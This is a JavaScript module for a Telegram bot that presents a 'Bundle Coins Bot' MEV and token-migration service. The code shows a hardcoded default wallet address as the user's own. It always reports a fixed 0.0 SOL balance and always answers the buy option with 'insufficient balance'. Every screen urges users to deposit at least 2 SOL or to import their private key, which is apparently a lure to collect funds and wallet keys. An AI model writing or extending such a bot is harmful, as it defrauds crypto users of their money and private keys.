const { userSessions } = require("./sessions");
const { button, markdownOptions } = require("./telegram-ui");
const { DEFAULT_PUBLIC_KEY } = require("./wallets");

async function handleStartMev(bot, call) {
  const chatId = call.message.chat.id;
  const pubkey = DEFAULT_PUBLIC_KEY;

  const text = `
🚀 *Launch Bundle Coins Bot*
_Automated burn-and-swap platform_

━━━━━━━━━━━━━━━━

⚡ *Migration Mode*
Designed to simplify token migrations through secure burn-and-swap workflows.

🔑 *Main Bundle Coins Bot Wallet*
\`${pubkey}\`
_(Tap to copy)_

💰 *Balance:* \`0.0 SOL\` \`($0.0)\`

🤖 *Auto Process*
One-click simplicity - our system handles verification and token swap steps.

━━━━━━━━━━━━━━━━

⚠️ *NOTE:* A 2% fee applies to profits.

💡 _Please keep at least 2 SOL in your wallet or import your private key to activate Bundle Coins Bot._
`;

  await bot.sendMessage(
    chatId,
    text,
    markdownOptions([
      [button("🤖 Start Buy Config", "start_mev_auto_buy")],
      [button("❌ Close", "start_mev_close"), button("🔄 Refresh", "StartNexisMEVRefresh")]
    ])
  );
}

async function handleStartMevCallback(bot, call) {
  const chatId = call.message.chat.id;
  const pubkey = userSessions[chatId]?.pubkey || DEFAULT_PUBLIC_KEY;

  if (call.data === "start_mev_close") {
    // Message deletion is disabled per user request.
  } else if (call.data === "start_mev_auto_buy") {
    const text = `❌ *Bundle Coins Bot Not Active*
Your current balance is *insufficient*.

━━━━━━━━━━━━━━━━

🔑 *Main Bundle Coins Bot Wallet*
\`${pubkey}\`
_(Tap to copy)_

💰 *Balance:* \`0.0 SOL\` \`($0.0)\`

━━━━━━━━━━━━━━━━

💡 _Please keep at least 2 SOL in your wallet or import your private key to activate Bundle Coins Bot._
`;

    await bot.sendMessage(
      chatId,
      text,
      markdownOptions([
        [button("📦 Wallet", "wallet"), button("🔑 Connect Wallet", "import_wallet")],
        [button("❌ Close", "start_mev_close")]
      ])
    );
  } else if (call.data === "StartNexisMEVRefresh") {
    // Message deletion is disabled per user request.
    await handleStartMev(bot, call);
  }
}

module.exports = {
  handleStartMev,
  handleStartMevCallback
};
